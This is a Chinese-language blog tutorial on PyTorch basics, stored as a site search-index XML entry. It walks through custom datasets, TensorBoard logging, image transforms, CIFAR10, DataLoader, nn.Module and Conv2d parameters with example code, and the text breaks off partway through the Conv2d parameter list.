<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>深度学习教程（附源码）</title>
    <link href="/2025/07/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89/"/>
    <url>/2025/07/15/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1-自定义数据集的设置-应用"><a href="#1-自定义数据集的设置-应用" class="headerlink" title="1.自定义数据集的设置&#x2F;应用"></a>1.自定义数据集的设置&#x2F;应用</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> Dataset<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyData</span>(<span class="hljs-title class_ inherited__">Dataset</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,root_dir,label_dir</span>):<br>        <span class="hljs-variable language_">self</span>.root_dir = root_dir<br>        <span class="hljs-variable language_">self</span>.label_dir = label_dir<br>        <span class="hljs-variable language_">self</span>.path = os.path.join(<span class="hljs-variable language_">self</span>.root_dir,<span class="hljs-variable language_">self</span>.label_dir)<br>        <span class="hljs-variable language_">self</span>.img_path = os.listdir(<span class="hljs-variable language_">self</span>.path)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        img_name = <span class="hljs-variable language_">self</span>.img_path[idx]<br>        img_item_path = os.path.join(<span class="hljs-variable language_">self</span>.root_dir,<span class="hljs-variable language_">self</span>.label_dir,img_name)<br>        img = Image.<span class="hljs-built_in">open</span>(img_item_path)<br>        label = <span class="hljs-variable language_">self</span>.label_dir<br>        <span class="hljs-keyword">return</span> img,label<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.img_path)<br><br><br>root_dir = <span class="hljs-string">&quot;dataset/train&quot;</span><br>ants_label_dir = <span class="hljs-string">&quot;ants_image&quot;</span><br>bees_label_dir = <span class="hljs-string">&quot;bees_image&quot;</span><br>ants_dataset = MyData(root_dir,ants_label_dir)<br>bees_dataset = MyData(root_dir,bees_label_dir)<br><br>train_dataset = ants_dataset + bees_dataset<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/1.png"></p><h1 id="2-TensorBoard的使用"><a href="#2-TensorBoard的使用" class="headerlink" title="2.TensorBoard的使用"></a>2.TensorBoard的使用</h1><ul><li>探究模型在不同阶段是如何输出的</li></ul><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>开发和训练深度学习模型时，你常常会遇到以下挑战：</strong></p><ul><li><strong>训练过程不透明</strong>： 模型在**“黑箱”**中训练，你不知道内部发生了什么（损失下降了吗？过拟合了吗？梯度爆炸了吗？）。</li><li><strong>调试困难</strong>： 当<strong>模型表现</strong>不如预期时，很难定位问题根源（是数据问题、模型架构问题、超参数问题还是代码bug？）。</li><li><strong>超参数调整耗时</strong>： 手动尝试不同的学习率、批次大小、网络层数等参数并比较结果非常低效。</li><li><strong>理解模型行为</strong>： 模型学到了什么？它关注输入数据的哪些部分？决策依据是什么？</li><li><strong>比较模型</strong>： 当你有多个模型变体或实验时，直观地比较它们的性能很困难。</li></ul><p>TensorBoard 就是为了解决这些问题而生的。 它通过将模型训练过程中的各种指标、数据和结构可视化，为开发者提供了一个直观的“仪表盘”，让训练过程变得透明、可解释、可调试和可优化。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装：pip install tensorboard</p><p>运行（不指定 port 的话默认 6006 端口）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">tensorboard --logdir=logs --port=6007<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/2.png"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">from torch.utils.tensorboard import SummaryWriter<br>import numpy as np<br>from PIL import Image<br><br><br>writer = SummaryWriter(&quot;logs&quot;)<br>image_path = &quot;dataset/train/ants_image/0013035.jpg&quot;<br>img_PIL = Image.open(image_path)<br>img_array = np.array(img_PIL)<br>print(type(img_array))<br>print(img_array.shape)<br><br><br><br>writer.add_image(&quot;test&quot;,img_array,1,dataformats=&quot;HWC&quot;)<br><br>for i in range(100):<br>    writer.add_scalar(&quot;y=2x&quot;,3*i,i)<br><br>writer.close()<br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/3.png"></p><h1 id="3-Transforms的常用方法和运行实例"><a href="#3-Transforms的常用方法和运行实例" class="headerlink" title="3.Transforms的常用方法和运行实例"></a>3.Transforms的常用方法和运行实例</h1><p><strong>多看源代码，源代码中直接有示例，正确率杠杠的</strong></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/1.png"></p><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>Transforms 是指对原始输入数据（如图像、文本、音频）或模型中间结果进行处理和修改的一系列操作。它们的主要目的是将原始数据转化为更适合模型训练、评估或推理的形式，或者是为了增强模型的性能和鲁棒性。</p><table><thead><tr><th>Transform</th><th>作用</th></tr></thead><tbody><tr><td><code>transforms.ToTensor()</code></td><td>将 PIL Image 或 ndarray 转换为 Tensor，且会将像素值从 <code>[0, 255]</code> 归一化到 <code>[0.0, 1.0]</code>。</td></tr><tr><td><code>transforms.Normalize(mean, std)</code></td><td>对 Tensor 图像进行归一化（标准化）：输出 &#x3D; (输入 - mean) &#x2F; std，通常用于模型训练时统一输入分布。</td></tr><tr><td><code>transforms.Resize(size)</code></td><td>将输入图像缩放到指定的尺寸（保持纵横比或指定新尺寸）。</td></tr><tr><td><code>transforms.CenterCrop(size)</code></td><td>从图像中心裁剪指定大小。</td></tr><tr><td><code>transforms.RandomCrop(size)</code></td><td>随机裁剪图像，用于数据增强。</td></tr><tr><td><code>transforms.RandomHorizontalFlip(p=0.5)</code></td><td>以概率 <code>p</code> 水平翻转图像，用于数据增强。</td></tr><tr><td><code>transforms.RandomVerticalFlip(p=0.5)</code></td><td>以概率 <code>p</code> 垂直翻转图像。</td></tr><tr><td><code>transforms.RandomRotation(degrees)</code></td><td>随机旋转图像一定角度范围，用于增加模型鲁棒性。</td></tr><tr><td><code>transforms.ColorJitter(brightness, contrast, saturation, hue)</code></td><td>随机改变图像亮度、对比度、饱和度、色调，增强多样性。</td></tr><tr><td><code>transforms.Grayscale(num_output_channels=1)</code></td><td>将图像转换为灰度图像。</td></tr><tr><td><code>transforms.RandomResizedCrop(size)</code></td><td>随机裁剪图像并缩放为指定大小，常用于训练。</td></tr><tr><td><code>transforms.RandomAffine(degrees, translate, scale, shear)</code></td><td>随机执行仿射变换（旋转、平移、缩放、剪切），提升泛化能力。</td></tr><tr><td><code>transforms.Lambda(func)</code></td><td>应用自定义函数 <code>func</code>，用于特殊的自定义操作。</td></tr><tr><td><code>transforms.Compose([...])</code></td><td>将多个变换操作组合在一起，按顺序执行。</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><br>writer = SummaryWriter(<span class="hljs-string">&quot;logs&quot;</span>)<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;images/china.jpg&quot;</span>)<br><span class="hljs-built_in">print</span>(img)<br><br><span class="hljs-comment"># ToTensor的使用</span><br>trans_totensor = transforms.ToTensor()<br>img_tensor = trans_totensor(img)<br>writer.add_image(<span class="hljs-string">&quot;ToTensor&quot;</span>,img_tensor)<br><span class="hljs-comment">#writer.close()</span><br><span class="hljs-comment">#验证： tensorboard --logdir=logs，查看图片是否正确加载</span><br><br><br><span class="hljs-comment">#Normalize</span><br><span class="hljs-built_in">print</span>(img_tensor[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&quot;原始图像范围:&quot;, img_tensor.min(), img_tensor.max())</span><br><span class="hljs-comment"># 如果原始图像是0-255范围，需要先转换为0-1：</span><br><span class="hljs-comment"># img_tensor = img_tensor.float() / 255.0</span><br>trans_norm = transforms.Normalize(mean=[<span class="hljs-number">0.485</span>, <span class="hljs-number">0.478</span>, <span class="hljs-number">0.406</span>], std=[<span class="hljs-number">0.529</span>, <span class="hljs-number">0.324</span>, <span class="hljs-number">0.225</span>])<br>img_norm = trans_norm(img_tensor)<br><span class="hljs-built_in">print</span>(img_norm[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])<br>writer.add_image(<span class="hljs-string">&quot;Normalize&quot;</span>,img_norm,<span class="hljs-number">2</span>)<br><br><br><span class="hljs-comment">#Resize</span><br><span class="hljs-built_in">print</span>(img.size)<br>trans_resize = transforms.Resize((<span class="hljs-number">512</span>,<span class="hljs-number">512</span>))<br><span class="hljs-comment"># img PIL -&gt; resize -&gt;img_resize PIL</span><br>img_resize = trans_resize(img)<br><span class="hljs-comment">#  img_resize PIL -&gt; totensor -&gt;img_resize tensor</span><br>img_resize = trans_totensor(img_resize)<br><span class="hljs-built_in">print</span>(img_resize)<br>writer.add_image(<span class="hljs-string">&quot;Resize&quot;</span>,img_resize,<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#compose - resize -2</span><br>trans_resize_2 = transforms.Resize(<span class="hljs-number">640</span>)<br><span class="hljs-comment">#compose 依次执行列表中的操作（需要保证后一个操作的输入与前一个操作的输出需要对应）</span><br>trans_compose = transforms.Compose([trans_resize_2,trans_totensor])<br>img_resize_2 = trans_compose(img)<br>writer.add_image(<span class="hljs-string">&quot;Resize&quot;</span>,img_resize_2,<span class="hljs-number">1</span>)<br><br><br><span class="hljs-comment"># RandomCrop 随机裁剪</span><br>trans_random = transforms.RandomCrop((<span class="hljs-number">128</span>,<span class="hljs-number">256</span>))<br>trans_compose_2 = transforms.Compose([trans_random,trans_totensor])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    img_crop = trans_compose_2(img)<br>    writer.add_image(<span class="hljs-string">&quot;RandomCropHW&quot;</span>, img_crop, i)<br><br><br><br>writer.close()<br><br><br><br></code></pre></td></tr></table></figure><p>运行截图（<font style="color:#080808;background-color:#ffffff;">tensorboard –logdir&#x3D;logs</font>）：</p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/2.png"></p><h1 id="4-torchvision中数据集的使用"><a href="#4-torchvision中数据集的使用" class="headerlink" title="4.torchvision中数据集的使用"></a>4.torchvision中数据集的使用</h1><p>:::info<br>如何下载&#x2F;使用他人数据集</p><p>:::</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  torchvision<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br><span class="hljs-comment">#将PIL图片转换成tensor数据类型</span><br>dataset_transform = torchvision.transforms.Compose([<br>    torchvision.transforms.ToTensor(),<br>])<br><br>train_set = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">True</span>,transform=dataset_transform,download=<span class="hljs-literal">True</span>)    <span class="hljs-comment">#下载CIFAR10数据集</span><br>test_set = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,transform=dataset_transform,download=<span class="hljs-literal">True</span>)    <span class="hljs-comment">#下载CIFAR10数据集</span><br><br><span class="hljs-built_in">print</span>(test_set[<span class="hljs-number">0</span>])          <span class="hljs-comment">#  (&lt;PIL.Image.Image image mode=RGB size=32x32 at 0x18CA4B1AE50&gt;, 3)</span><br><span class="hljs-comment"># print(test_set.classes)        # [&#x27;airplane&#x27;, &#x27;automobile&#x27;, &#x27;bird&#x27;, &#x27;cat&#x27;, &#x27;deer&#x27;, &#x27;dog&#x27;, &#x27;frog&#x27;, &#x27;horse&#x27;, &#x27;ship&#x27;, &#x27;truck&#x27;]</span><br><span class="hljs-comment"># img,target = test_set[0]</span><br><span class="hljs-comment"># print(img)                              # &lt;PIL.Image.Image image mode=RGB size=32x32 at 0x1CDC3BEC0D0&gt;</span><br><span class="hljs-comment"># print(target)                           # 3</span><br><span class="hljs-comment"># print(test_set.classes[target])        #cat</span><br><span class="hljs-comment"># img.show()                          #打开图片</span><br><br>writer = SummaryWriter(<span class="hljs-string">&quot;/logs/p10&quot;</span>)           <span class="hljs-comment">#SummaryWriter日志写入器，p10是日志文件目录</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    img,target = test_set[i]<br>    writer.add_image(<span class="hljs-string">&quot;test_set&quot;</span>,img,i)          <span class="hljs-comment">#将图像写入tensorboard</span><br><br><br>writer.close()                      <span class="hljs-comment">#正常关闭SummaryWriter，刷新缓冲区，写入日志。</span><br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/3.png"></p><h1 id="5-DataLoader的使用"><a href="#5-DataLoader的使用" class="headerlink" title="5.DataLoader的使用"></a>5.DataLoader的使用</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torchvision<br><span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader<br><span class="hljs-keyword">from</span> torch.utils.tensorboard <span class="hljs-keyword">import</span> SummaryWriter<br><br><span class="hljs-comment"># 准备的测试数据集</span><br>test_data = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&quot;./download_dataset&quot;</span>,train=<span class="hljs-literal">False</span>,transform=torchvision.transforms.ToTensor())<br><br><span class="hljs-comment">#                           数据集          每批次的图片数量   每批次的训练图片是否随机</span><br>test_loader = DataLoader(dataset=test_data,batch_size=<span class="hljs-number">64</span>,shuffle=<span class="hljs-literal">True</span>,num_workers=<span class="hljs-number">0</span>,drop_last=<span class="hljs-literal">True</span>)<br>                                                                    <span class="hljs-comment">#多进程加载          丢掉最后一个不完整的batch</span><br><br>img,target = test_data[<span class="hljs-number">0</span>]           <span class="hljs-comment"># 当取test_data[0]数据的时候会调用cifar.py中的__getitem__方法，return格式为return img, target</span><br><span class="hljs-built_in">print</span>(img.shape)                <span class="hljs-comment"># torch.Size([3, 32, 32])</span><br><span class="hljs-built_in">print</span>(target)                   <span class="hljs-comment">#3</span><br><br>writer = SummaryWriter(<span class="hljs-string">&quot;/logs/DataLoader&quot;</span>)<br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    step = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> test_loader:<br>        imgs,targets = data<br>        <span class="hljs-comment"># print(imgs.shape)        # torch.Size([64, 3, 32, 32])</span><br>        <span class="hljs-comment"># print(targets)</span><br>        writer.add_images(<span class="hljs-string">&quot;DataLoader&quot;</span>,imgs,step)<br>        step = step +<span class="hljs-number">1</span><br><br>writer.close()<br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/4.png"></p><h1 id="6-神经网络-nn-Module的使用"><a href="#6-神经网络-nn-Module的使用" class="headerlink" title="6.神经网络-nn.Module的使用"></a>6.神经网络-nn.Module的使用</h1><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/5.png"></p><h2 id="Moudle"><a href="#Moudle" class="headerlink" title="Moudle"></a>Moudle</h2><ul><li>base classes for all neural network modules</li><li>Moudles can also contain other Moudlers ,allowing them to be nested in a tree structure. You can assign the submodules as regular attributes</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#https://docs.pytorch.org/docs/stable/generated/torch.nn.Module.html#torch.nn.Module</span><br><br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Jimi_nn</span>(nn.Module):       <span class="hljs-comment">#自定义神经网络的实现</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span></span>):<br>        output = <span class="hljs-built_in">input</span> + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> output<br><br>Jimi = Jimi_nn()<br>x = torch.tensor(<span class="hljs-number">1.0</span>)<br>output = Jimi(x)        <span class="hljs-comment"># 调用Jimi.__call__(x) → Jimi.forward(x)</span><br><span class="hljs-built_in">print</span>(output)<br><br><br></code></pre></td></tr></table></figure><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/6.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/7.png"></p><h1 id="7-神经网络-卷积层"><a href="#7-神经网络-卷积层" class="headerlink" title="7.神经网络-卷积层"></a>7.神经网络-卷积层</h1><h2 id="卷积"><a href="#卷积" class="headerlink" title="卷积"></a>卷积</h2><p><a href="https://docs.pytorch.org/docs/stable/generated/torch.nn.Conv2d.html">https://docs.pytorch.org/docs/stable/generated/torch.nn.Conv2d.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">CLASStorch.nn.Conv2d(in_channels, out_channels, kernel_size, stride=<span class="hljs-number">1</span>, padding=<span class="hljs-number">0</span>, dilation=<span class="hljs-number">1</span>, groups=<span class="hljs-number">1</span>, bias=<span class="hljs-literal">True</span>, padding_mode=<span class="hljs-string">&#x27;zeros&#x27;</span>, device=<span class="hljs-literal">None</span>, dtype=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><h4 id="公式讲解"><a href="#公式讲解" class="headerlink" title="公式讲解"></a><font style="color:#080808;background-color:#ffffff;">公式讲解</font></h4><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/8.png"></p><p><img src="/../img/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E6%BA%90%E7%A0%81%EF%BC%89.md/9.png"></p><h3 id="conv2d-Parameters"><a href="#conv2d-Parameters" class="headerlink" title="conv2d Parameters"></a><font style="color:#080808;background-color:#ffffff;">conv2d </font><font style="color:rgb(38, 38, 38);">Parameters</font></h3><ul><li><strong><font style="color:rgb(38, 38, 38);">in_channels</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><strong><font style="color:rgb(38, 38, 38);">) – Number of channels in the input image</font></strong></li><li><strong><font style="color:rgb(38, 38, 38);">out_channels</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><strong><font style="color:rgb(38, 38, 38);">) – Number of channels produced by the convolution</font></strong></li><li><strong><font style="color:rgb(38, 38, 38);">kernel_size</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);"> </font></strong><strong><strong><font style="color:rgb(38, 38, 38);">or</font></strong></strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></em><a href="https://docs.python.org/3/library/stdtypes.html#tuple"><strong><font style="color:rgb(238, 76, 44);">tuple</font></strong></a><strong><font style="color:rgb(38, 38, 38);">) – Size of the convolving kernel</font></strong></li><li><strong><font style="color:rgb(38, 38, 38);">stride</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);"> </font></strong><strong><strong><font style="color:rgb(38, 38, 38);">or</font></strong></strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></em><a href="https://docs.python.org/3/library/stdtypes.html#tuple"><strong><font style="color:rgb(238, 76, 44);">tuple</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);">,</font></strong><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><strong><font style="color:rgb(38, 38, 38);">optional</font></strong></em><strong><font style="color:rgb(38, 38, 38);">) – Stride of the convolution. Default: 1</font></strong></li><li><strong><font style="color:rgb(38, 38, 38);">padding</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);">,</font></strong>__<strong><font style="color:rgb(38, 38, 38);"> </font></strong></em><a href="https://docs.python.org/3/library/stdtypes.html#tuple"><strong><font style="color:rgb(238, 76, 44);">tuple</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);"> </font></strong><strong><strong><font style="color:rgb(38, 38, 38);">or</font></strong></strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></em><a href="https://docs.python.org/3/library/stdtypes.html#str"><strong><font style="color:rgb(238, 76, 44);">str</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);">,</font></strong><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><strong><font style="color:rgb(38, 38, 38);">optional</font></strong></em><strong><font style="color:rgb(38, 38, 38);">) – Padding added to all four sides of the input. Default: 0</font></strong></li><li><strong><font style="color:rgb(38, 38, 38);">dilation</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 38);">(</font></strong><a href="https://docs.python.org/3/library/functions.html#int"><strong><font style="color:rgb(238, 76, 44);">int</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);"> </font></strong><strong><strong><font style="color:rgb(38, 38, 38);">or</font></strong></strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></em><a href="https://docs.python.org/3/library/stdtypes.html#tuple"><strong><font style="color:rgb(238, 76, 44);">tuple</font></strong></a><em><strong><font style="color:rgb(38, 38, 38);">,</font></strong><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><strong><font style="color:rgb(38, 38, 38);">optional</font></strong></em><strong><font style="color:rgb(38, 38, 38);">) – Spacing between kernel elements. Default: 1</font></strong></li><li><strong><font style="color:rgb(38, 38, 38);">groups</font><strong><strong><font style="color:rgb(38, 38, 38);"> </font></strong></strong><font style="color:rgb(38, 38, 